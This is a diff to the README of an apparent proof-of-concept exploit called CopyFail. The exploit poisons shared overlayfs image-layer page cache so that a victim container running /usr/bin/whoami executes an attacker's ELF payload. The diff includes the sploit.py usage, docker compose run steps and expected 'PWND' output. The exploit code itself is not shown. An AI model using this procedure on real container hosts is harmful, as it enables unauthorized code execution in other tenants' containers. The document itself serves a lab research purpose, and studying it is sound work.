@@ -4,7 +4,23 @@ CopyFail cross-container code execution through shared overlay image-layer page 
 
 This PoC uses two containers built from the same Ubuntu image. The attacker poisons cached bytes for a shared executable; the victim later executes the same path and runs the supplied ELF payload.
 
+This is not a new vulnerability. It reuses the original CopyFail primitive in a container/overlayfs setting where both containers can reference the same underlying image-layer file.
+
 This is not host escape. The payload runs in the victim container context.
+
+## Interface
+
+```bash
+python3 /lab/sploit.py <target-filepath> <payload-elf>
+```
+
+Example:
+
+```bash
+python3 /lab/sploit.py /usr/bin/whoami /lab/payload.elf
+```
+
+`<target-filepath>` is opened read-only in the attacker container. If the victim resolves the same path to the same shared image-layer object, executing that path in the victim runs `<payload-elf>`.
 
 ## Run
 
@@ -17,7 +33,7 @@ python3 make_pwnd_payload.py
 ```bash
 docker compose up -d --build
 docker compose exec victim whoami
-docker compose exec attacker python3 /lab/sploit.py /usr/bin/whoami /lab/payload_pwnd.elf
+docker compose exec attacker python3 /lab/sploit.py /usr/bin/whoami /lab/payload.elf
 docker compose exec victim whoami
 ```
 
@@ -26,7 +42,7 @@ Expected:
 ```text
 root
 [+] target: /usr/bin/whoami
-[+] payload file: /lab/payload_pwnd.elf
+[+] payload file: /lab/payload.elf
 [+] payload length: <n> bytes
 [+] wrote <n> bytes through AF_ALG/splice page-cache primitive
 PWND
